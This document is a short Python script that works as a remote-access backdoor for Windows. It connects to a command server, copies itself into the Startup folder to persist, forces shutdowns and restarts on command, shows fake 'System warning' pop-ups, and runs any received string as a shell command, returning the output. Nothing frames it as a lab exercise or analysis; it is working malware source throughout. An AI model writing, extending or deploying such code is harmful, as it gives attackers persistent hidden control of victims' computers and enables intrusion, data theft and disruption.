import socket
import os
import subprocess
import time
import webbrowser as wb
from plyer import notification
import shutil
import sys

s = socket.socket()
while True:
    try:
        HOST = "127.0.0.1"
        PORT = 8000

        s.connect((HOST, PORT))
        break
    except Exception as e:
        print("Connection Problem With Server")
        print(e)
        time.sleep(3)

def show_alert(alert):
    notification.notify(
    title="System warning",
    message=f"{alert}",
    timeout = 5
    )

def add_to_startup():
    startup_path = os.path.join(os.getenv('APPDATA'), 
        r'Microsoft\Windows\Start Menu\Programs\Startup')

    exe_path = sys.executable
    file_name = os.path.basename(exe_path)
    destination = os.path.join(startup_path, file_name)

    if not os.path.exists(destination):
        shutil.copy(exe_path, destination)


if __name__ =="__main__":
    add_to_startup()
    while True:
        try:
            cmd = s.recv(5000)

            if not cmd:
                continue

            cmd = cmd.decode()

            print(f"command : {cmd}")

            

            if cmd == "exit":
                print("Connection Disconnecting")
                break

            elif cmd == "shutdown":
                os.system("shutdown -s -f -t 0")

            elif cmd == "restart":
                os.system("shutdown -r -f -t 0")

            elif cmd.startswith("open "):
                try:

                    app = cmd.replace("open ", "").strip()
            #os.system("Taskkill /IM chrome.exe /F")
            #os.system("Taskkill /IM msedge.exe /F")
            #os.system("Taskkill /IM firefox.exe /F")
                    wb.open(f"https://{app}.com")        

                    s.send(f"{app} opened".encode())   # 🔥 add this
                except:
                    s.send("wrong domain name".encode()) 
            
            elif cmd.startswith("show_alert "):
                try:

                    alert = cmd.replace("show_alert ", "").strip()
            
                    show_alert(f"{alert}")        

                    s.send("alert showed".encode())   # 🔥 add this
                except:
                    s.send("alert not showed".encode())
            
            else:
                try:
                    syscmd = subprocess.check_output(cmd, shell=True)

                    sysmsg = syscmd.decode()

                    s.send(sysmsg.encode())

                except Exception as p:
                    error = str(p)

                    s.send(error.encode())

        except Exception as f:
            s.send("task complete".encode())
            print("Connection Stopped")
            print(f"Error : {f}")
            break

    


